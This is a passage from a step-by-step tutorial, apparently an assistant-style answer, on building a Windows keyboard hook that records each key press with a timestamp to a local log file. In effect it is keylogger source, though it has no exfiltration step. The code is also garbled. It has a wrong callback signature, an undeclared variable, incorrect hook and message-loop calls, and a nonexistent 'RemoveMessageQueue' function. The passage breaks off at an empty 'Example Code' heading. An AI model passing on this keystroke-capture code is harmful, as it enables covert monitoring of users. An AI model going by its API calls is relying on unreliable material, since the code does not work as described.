   LRESULT CALLBACK keyboardHook(int hwnd, int wEvent, UINT uParam, int id, DWORD dwTime, DWORD dwReserved) {
       if (wEvent == WM_KEYDOWN) {
           // Process the key press here
           char key = static_cast<char>(wParam);
           // Add logging logic for the key
           // Example: Append key to a log file
           FILE *file = fopen("keyboard_log.txt", "a");
           if (file) {
               fprintf(file, "Key pressed: %c at %d\n", key, time(NULL));
               fclose(file);
           }
       }
       return 0;
   }
   ```

3. **Set Up the Keyboard Hook**: Use `SetWindowsHook` to attach the function.
   ```c
   HWND hwnd = GetDesktopWindow();
   HHOOK hKeyboardHook = SetWindowsHook(WH_KEYBOARD_LL, keyboardHook);
   if (!hKeyboardHook) {
       // Handle error
       printf("Failed to set keyboard hook\n");
       return 1;
   }
   ```

4. **Attach and Process Events**: Use a loop to handle incoming events.
   ```c
   MSG msg;
   while (GetMessage(&msg, hwnd)) {
       if (TranslateMessage(&msg)) {
           if (msg.wParam == 0) {
               // Translate message if necessary
               continue;
           }
       }
       // Check if the message is a keyboard event
       if (msg.message == WM_KEYDOWN) {
           // Process the key press
           // This will call the keyboardHook function
           // Already handled in the hook function
       }
   }
   ```

5. **Clean Up**: Unhook the keyboard and destroy the event queue.
   ```c
   if (hKeyboardHook) {
       UnhookWindowsHook(hKeyboardHook);
   }
   DestroyWindow(msg.hwnd);
   RemoveMessageQueue(hwnd);
   ```

### Example Code

